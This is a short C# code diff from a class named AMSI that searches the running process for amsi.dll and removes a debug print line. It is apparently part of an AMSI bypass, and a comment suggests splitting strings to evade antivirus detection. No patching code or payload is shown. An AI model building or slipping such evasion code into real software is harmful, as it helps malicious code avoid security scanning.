@@ -28,7 +28,6 @@ public class AMSI
         string dll = "amsi.dll";
         foreach (ProcessModule CurrentModule in (Process.GetCurrentProcess().Modules))
         {
-            Console.WriteLine(CurrentModule.ModuleName);
             if (CurrentModule.ModuleName == dll)
             {
                 //Can always seperate strings to avoid AntiV
